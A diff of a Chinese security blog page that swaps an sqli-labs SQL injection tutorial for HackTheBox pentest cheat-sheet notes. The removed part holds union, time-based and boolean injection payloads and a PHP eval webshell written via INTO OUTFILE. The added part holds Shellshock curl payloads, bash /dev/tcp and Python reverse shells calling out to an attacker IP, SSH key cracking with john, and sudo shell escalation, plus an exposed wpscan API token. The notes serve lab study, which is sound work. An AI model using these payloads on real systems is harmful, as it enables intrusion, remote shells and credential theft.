@@ -4,20 +4,12 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="基于sqli_lab的sql注入详解(一), ezy&#39;s blog">
-    <meta name="description" content="mysql的目录结构mysql 5.0以上的版本中，默认定义了information_schema数据库，其中包含有表schemata(数据库名)、tables、columns(列名)
-
-
-
-
-表名
-含有重要列名
-
-
-
-
-schemata
-">
+    <meta name="keywords" content="hackthebox, ezy&#39;s blog">
+    <meta name="description" content="nmapnmap -sTVC ip
+nmap -sTVC 10.10.10.7 -Pn 无Ping扫描
+nmap -p- -T5 ip 以最快速度扫描所有端口
+降低–max-retries可以加快扫描，但可能无法得到准确的结果
+nmap -">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -29,7 +21,7 @@ schemata
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>基于sqli_lab的sql注入详解(一) | ezy&#39;s blog</title>
+    <title>hackthebox | ezy&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -215,12 +207,12 @@ schemata
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">基于sqli_lab的sql注入详解(一)</h1>
+                    <h1 class="description center-align post-title">hackthebox</h1>
                 </div>
             </div>
         </div>
@@ -336,8 +328,12 @@ schemata
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/sql-injection/">
-                                <span class="chip bg-color">sql_injection</span>
+                            <a href="/tags/%E9%9D%B6%E5%9C%BA/">
+                                <span class="chip bg-color">靶场</span>
+                            </a>
+                        
+                            <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                                <span class="chip bg-color">笔记</span>
                             </a>
                         
                     </div>
@@ -361,28 +357,28 @@ schemata
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-14
+                    2022-09-19
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-11-06
+                    2022-09-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    7 分
                 </div>
                 
 
@@ -410,142 +406,164 @@ schemata
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="mysql的目录结构"><a href="#mysql的目录结构" class="headerlink" title="mysql的目录结构"></a>mysql的目录结构</h2><p>mysql 5.0以上的版本中，默认定义了information_schema数据库，其中包含有表schemata(数据库名)、tables、columns(列名)</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">表名</th>
-<th style="text-align:center">含有重要列名</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">schemata</td>
-<td style="text-align:center">schema_name</td>
-</tr>
-<tr>
-<td style="text-align:center">tables</td>
-<td style="text-align:center">table_schema, table_name</td>
-</tr>
-<tr>
-<td style="text-align:center">columns</td>
-<td style="text-align:center">table_schema, table_name, column_name</td>
-</tr>
-</tbody>
-</table>
-</div>
-<hr>
-<h2 id="基于报错的SQL注入"><a href="#基于报错的SQL注入" class="headerlink" title="基于报错的SQL注入"></a>基于报错的SQL注入</h2><h3 id="以less-1为例"><a href="#以less-1为例" class="headerlink" title="以less-1为例"></a>以less-1为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f1.png" alt="">   </p>
-<h3 id="这里提示输入ID作为参数值，那输入一下试试看"><a href="#这里提示输入ID作为参数值，那输入一下试试看" class="headerlink" title="这里提示输入ID作为参数值，那输入一下试试看"></a>这里提示输入ID作为参数值，那输入一下试试看</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="返回结果1"><a href="#返回结果1" class="headerlink" title="返回结果1"></a>返回结果1</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f2.png" alt=""></p>
-<h3 id="Less-1已经指出是error-based-single-quotes-所以直接加单引号尝试报错注入"><a href="#Less-1已经指出是error-based-single-quotes-所以直接加单引号尝试报错注入" class="headerlink" title="Less-1已经指出是error based-single quotes,所以直接加单引号尝试报错注入"></a>Less-1已经指出是error based-single quotes,所以直接加单引号尝试报错注入</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="返回结果2"><a href="#返回结果2" class="headerlink" title="返回结果2"></a>返回结果2</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f3.png" alt="">  </p>
-<blockquote>
-<p><strong>‘’1’’ LIMIT 0,1’</strong><br>观察报错语句，去掉最外层的引号，它是将从sql查询语句错误的地方开始用引号引起来，到语句结束处引号结束<br>去掉引号之后，变为 <strong>‘1’’ LIMIT 0,1</strong><br>我们对ID的赋值为  <strong>1’</strong><br>所以可以猜到查询语句对ID的查询是单引号包起来<br>这里可以看一下PHP源码<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f4.png" alt=""><br>可以看出ID确实是被单引号包裹起来的  </p>
-</blockquote>
-<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><ol>
-<li><p>检测字段数  </p>
-<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=1' order by 3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<ul>
-<li>order by 3 返回正确结果</li>
-<li>order by 4 返回错误</li>
-<li>所以为3个字段  </li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f5.png" alt="">  </p>
-</li>
-<li><p>检测当前数据库的表名</p>
-<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<ul>
-<li>因为前面检测出了3个字段，所以Union select 1,2,3</li>
-<li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f6.png" alt=""> </li>
-<li>可以看出数字2和3在页面显示出来了，所以选择在2或者3上注入</li>
-</ul>
-<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<ul>
-<li>使用union select语句要注意$\color{red}{前面的条件不能成立，可赋id=-1}$</li>
-<li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f7.png" alt=""></li>
-</ul>
-</li>
-<li><p>检测某一个表的列名</p>
-<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<ul>
-<li>记得表名要加单引号包裹起来</li>
-<li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f8.png" alt=""></li>
-</ul>
-</li>
-</ol>
-<ol>
-<li><p>爆出整个表或某几个想要的列</p>
-<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' UNION ALL SELECT 1,group_concat(username,0x3a,password),3 from users --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<ul>
-<li>0x3a表示引号，可以分开用户名和密码</li>
-<li>$\color{red}{返回结果}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f9.png" alt=""></li>
-</ul>
-</li>
-</ol>
-<hr>
-<h2 id="关于mysql的注释"><a href="#关于mysql的注释" class="headerlink" title="关于mysql的注释"></a>关于mysql的注释</h2><h3 id="常见注释符"><a href="#常见注释符" class="headerlink" title="常见注释符"></a>常见注释符</h3><ul>
-<li><h1 id="或—-或"><a href="#或—-或" class="headerlink" title="或—+或/**/"></a>或—+或/**/</h1></li>
-</ul>
-<h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><ul>
-<li>在注释的开头处加上！便可执行mysql语句，只对mysql有效，常用来绕过WAF<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f10.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f11.png" alt=""></li>
-</ul>
-<hr>
-<h2 id="基于时间的延时注入"><a href="#基于时间的延时注入" class="headerlink" title="基于时间的延时注入"></a>基于时间的延时注入</h2><h3 id="以less-9为例"><a href="#以less-9为例" class="headerlink" title="以less-9为例"></a>以less-9为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f12.png" alt=""> </p>
-<ul>
-<li>测试id参数发现不管是否加引号都会返回相同的结果，所以无法使用报错注入</li>
-<li>这里可以看一下PHP源码<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f14.png" alt="">  </li>
-</ul>
-<h3 id="利用if语句，若真则返回1，若假则延时3s"><a href="#利用if语句，若真则返回1，若假则延时3s" class="headerlink" title="利用if语句，若真则返回1，若假则延时3s"></a>利用if语句，若真则返回1，若假则延时3s</h3><p>$\color{red}{真，时间为2s左右}$<br><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,1,sleep(3)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f13.png" alt=""><br>$\color{red}{假，时间为5s左右}$<br><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-9/?id=1' and if(ascii(substr(database(),1,1))=116,1,sleep(3)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f15.png" alt="">   </p>
-<blockquote>
-<ul>
-<li>注意payload要加and</li>
-</ul>
-</blockquote>
-<hr>
-<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="以less-8为例"><a href="#以less-8为例" class="headerlink" title="以less-8为例"></a>以less-8为例</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-8/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<ul>
-<li>加单引号发现错误界面<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f16.png" alt=""> </li>
-</ul>
-<h3 id="利用返回的布尔值注入"><a href="#利用返回的布尔值注入" class="headerlink" title="利用返回的布尔值注入"></a>利用返回的布尔值注入</h3><h4 id="返回错误界面"><a href="#返回错误界面" class="headerlink" title="返回错误界面"></a>返回错误界面</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-8/?id=1' and length(database()) &lt; 8 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="返回正确界面"><a href="#返回正确界面" class="headerlink" title="返回正确界面"></a>返回正确界面</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-8/?id=1' and length(database()) &lt; 9 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="从而确定length-database-8"><a href="#从而确定length-database-8" class="headerlink" title="从而确定length(database())=8"></a>从而确定length(database())=8</h4><hr>
-<h2 id="mysql读文件"><a href="#mysql读文件" class="headerlink" title="mysql读文件"></a>mysql读文件</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ul>
-<li>权限够高</li>
-<li>secure_file_priv不为NULL，需要通过my.ini修改<blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f17.png" alt=""><br>$\color{red}{设置为空格即可}$<br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f18.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f19.png" alt=""></p>
-</blockquote>
-</li>
-</ul>
-<h3 id="以less-1为例进行读文件"><a href="#以less-1为例进行读文件" class="headerlink" title="以less-1为例进行读文件"></a>以less-1为例进行读文件</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-1/?id=-1' union select 1,load_file('F:\\flag.txt'),3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f20.png" alt=""></p>
-<hr>
-<h2 id="mysql写文件"><a href="#mysql写文件" class="headerlink" title="mysql写文件"></a>mysql写文件</h2><h3 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h3><ul>
-<li>权限够高</li>
-<li>设置变量general_log为ON<blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f21.png" alt=""></p>
-</blockquote>
-</li>
-</ul>
-<h3 id="以less-7为例"><a href="#以less-7为例" class="headerlink" title="以less-7为例"></a>以less-7为例</h3><h4 id="正确界面"><a href="#正确界面" class="headerlink" title="正确界面"></a>正确界面</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f22.png" alt=""></p>
-<h4 id="反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面"><a href="#反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面" class="headerlink" title="反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面"></a>反复增加引号或括号个数，尝试闭合参数id，最后得出正确界面</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-7/?id=1')) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="可以写入一句话，然后使用蚁剑连接"><a href="#可以写入一句话，然后使用蚁剑连接" class="headerlink" title="可以写入一句话，然后使用蚁剑连接"></a>可以写入一句话，然后使用蚁剑连接</h4><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//127.0.0.1/sqli/Less-7/?id=-1')) union select 1,2,'&lt;?php eval($_POST["ezy"]);?>' into outfile "F:\\phpstudy_pro\\PHPTutorial\\WWW\\sqli\\Less-7\\1.php" --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f23.png" alt=""></p>
-<hr>
-<h2 id="mysql报错注入"><a href="#mysql报错注入" class="headerlink" title="mysql报错注入"></a>mysql报错注入</h2><h3 id="以less-5为例"><a href="#以less-5为例" class="headerlink" title="以less-5为例"></a>以less-5为例</h3><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f24.png" alt=""></p>
-<h3 id="利用-floor-rand-group-by进行报错注入"><a href="#利用-floor-rand-group-by进行报错注入" class="headerlink" title="利用 floor(),rand(),group by进行报错注入"></a>利用 floor(),rand(),group by进行报错注入</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//192.168.0.104/sqli/Less-5/?id=0' union select 1,2,count(*)  from information_schema.columns group by concat((select table_name from information_schema.tables where table_schema = database() limit 3,1),0x3a,floor(rand(0)*2)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<blockquote>
-<ul>
-<li>注意只能返回一行数据，所以使用limit</li>
-</ul>
-</blockquote>
-<h4 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_sql_injection/mysql_injection_f25.png" alt=""></p>
-<blockquote>
-<ul>
-<li>通过改变payload爆出其他数据</li>
-</ul>
-</blockquote>
+                <h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sTVC ip
+nmap -sTVC 10.10.10.7 -Pn 无Ping扫描
+nmap -p- -T5 ip 以最快速度扫描所有端口
+降低–max-retries可以加快扫描，但可能无法得到准确的结果
+nmap -p- 10.10.10.76 --max-retries 0 
+nmap --script vuln -sV -p 22,80,443 10.10.10.79 扫漏洞
+nmap -sV -sC 10.10.10.76 -p 79,111,515,22022 针对端口做详细扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wpscan --update
+wpscan --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; -e vp --disable-tls-checks 
+wpscan --url https:&#x2F;&#x2F;brainfuck.htb&#x2F; -e vp --disable-tls-checks --api-token&#x3D;DLQAcIK7uxrUlZFPOq9lIWJnfmgPy2QiWsBt4E96Qok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="smtp"><a href="#smtp" class="headerlink" title="smtp"></a>smtp</h2><p>smtp登陆工具 evolution<br>apt-get install evolution</p>
+<h2 id="破解id-rsa私钥"><a href="#破解id-rsa私钥" class="headerlink" title="破解id_rsa私钥"></a>破解id_rsa私钥</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">locate ssh2john.py
+python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; id_rsa_hash
+john id_rsa_hash --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt
+chmod 600 id_rsa
+ssh -i id_rsa Orestis@brainfuck.htb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>rsa已知pqe解密密文脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> u<span class="token punctuation">,</span>v <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span>
+    <span class="token keyword">while</span> a <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        q<span class="token punctuation">,</span> r <span class="token operator">=</span> b<span class="token operator">//</span>a<span class="token punctuation">,</span> b<span class="token operator">%</span>a
+        m<span class="token punctuation">,</span> n <span class="token operator">=</span> x<span class="token operator">-</span>u<span class="token operator">*</span>q<span class="token punctuation">,</span> y<span class="token operator">-</span>v<span class="token operator">*</span>q
+        b<span class="token punctuation">,</span>a<span class="token punctuation">,</span> x<span class="token punctuation">,</span>y<span class="token punctuation">,</span> u<span class="token punctuation">,</span>v <span class="token operator">=</span> a<span class="token punctuation">,</span>r<span class="token punctuation">,</span> u<span class="token punctuation">,</span>v<span class="token punctuation">,</span> m<span class="token punctuation">,</span>n
+        gcd <span class="token operator">=</span> b
+    <span class="token keyword">return</span> gcd<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p <span class="token operator">=</span> <span class="token number">1090660992520643446103273789680343</span>
+    q <span class="token operator">=</span> <span class="token number">1162435056374824133712043309728653</span>
+    e <span class="token operator">=</span> <span class="token number">65537</span>
+    ct <span class="token operator">=</span> <span class="token number">299604539773691895576847697095098784338054746292313044353582078965</span>
+
+    <span class="token comment"># compute n</span>
+    n <span class="token operator">=</span> p <span class="token operator">*</span> q
+
+    <span class="token comment"># Compute phi(n)</span>
+    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># Compute modular inverse of e</span>
+    gcd<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b <span class="token operator">=</span> egcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
+    d <span class="token operator">=</span> a
+
+    <span class="token keyword">print</span><span class="token punctuation">(</span> <span class="token string">"n:  "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment"># Decrypt ciphertext</span>
+    pt <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>ct<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span> <span class="token string">"pt: "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>pt<span class="token punctuation">)</span> <span class="token punctuation">)</span>
+    
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="web目录爆破"><a href="#web目录爆破" class="headerlink" title="web目录爆破"></a>web目录爆破</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gobuster dir -u http:&#x2F;&#x2F;10.10.10.56&#x2F; -w &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt -x php,cgi,py,txt 
+dirb目录爆破（自定义user-agent）
+dirb http:&#x2F;&#x2F;10.10.10.58:3000&#x2F; -a &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko&#x2F;20100101 Firefox&#x2F;104.0&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>/cgi-bin/ apache特有目录，可以对该目录继续爆破，查看是否有脚本文件</p>
+<h2 id="shellshock攻击cgi程序"><a href="#shellshock攻击cgi程序" class="headerlink" title="shellshock攻击cgi程序"></a>shellshock攻击cgi程序</h2><p> <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/35579956">https://zhuanlan.zhihu.com/p/35579956</a></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">curl -A &quot;() &#123; :;&#125;;echo; &#x2F;bin&#x2F;nc -lp 10086 -c bash&quot; http:&#x2F;&#x2F;192.168.59.142&#x2F;cgi-bin&#x2F;file 
+（&#x2F;cgi-bin&#x2F;目录下的任意文件）
+
+curl -A &quot;() &#123; :;&#125;;echo; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.10&#x2F;4444 0&gt;&amp;1&quot; http:&#x2F;&#x2F;10.10.10.56&#x2F;cgi-bin&#x2F;user.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="python3创建完整shell"><a href="#python3创建完整shell" class="headerlink" title="python3创建完整shell"></a>python3创建完整shell</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python3 -c &quot;__import__(&#39;pty&#39;).spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;   (  python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;   )  (  python3 -c &quot;__import__(&#39;subprocess&#39;).call([&#39;&#x2F;bin&#x2F;bash&#39;])&quot;   )
+export TERM&#x3D;XTERM
+ctrl+z
+stty raw -echo &amp;&amp; fg
+enter
+stty rows 46 &amp;&amp; stty columns 171 &amp;&amp; export TERM&#x3D;xterm
+取得完整shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="perl开启shell命令"><a href="#perl开启shell命令" class="headerlink" title="perl开启shell命令"></a>perl开启shell命令</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="脚本化的本地-Linux-枚举和权限提升检查"><a href="#脚本化的本地-Linux-枚举和权限提升检查" class="headerlink" title="脚本化的本地 Linux 枚举和权限提升检查"></a>脚本化的本地 Linux 枚举和权限提升检查</h2><p>LinEnum.sh</p>
+<h2 id="以指定用户执行bash命令"><a href="#以指定用户执行bash命令" class="headerlink" title="以指定用户执行bash命令"></a>以指定用户执行bash命令</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo -u 用户名 bash （提权到该指定用户权限（如果不需要密码的话））
+
+bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.10&#x2F;4242 0&gt;&amp;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="python反弹shell脚本"><a href="#python反弹shell脚本" class="headerlink" title="python反弹shell脚本"></a>python反弹shell脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>os<span class="token punctuation">,</span>pty
+s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"10.10.14.10"</span><span class="token punctuation">,</span><span class="token number">4242</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>
+os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
+pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="smbclient命令"><a href="#smbclient命令" class="headerlink" title="smbclient命令"></a>smbclient命令</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">smbclient -L 10.10.10.3      
+
+进入tmp目录
+smbclient &#x2F;&#x2F;10.10.10.3&#x2F;tmp
+
+下载文件
+get 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="dig查询DNS-记录"><a href="#dig查询DNS-记录" class="headerlink" title="dig查询DNS 记录"></a>dig查询DNS 记录</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dig @ip 域名
+dig @ip 域名 any
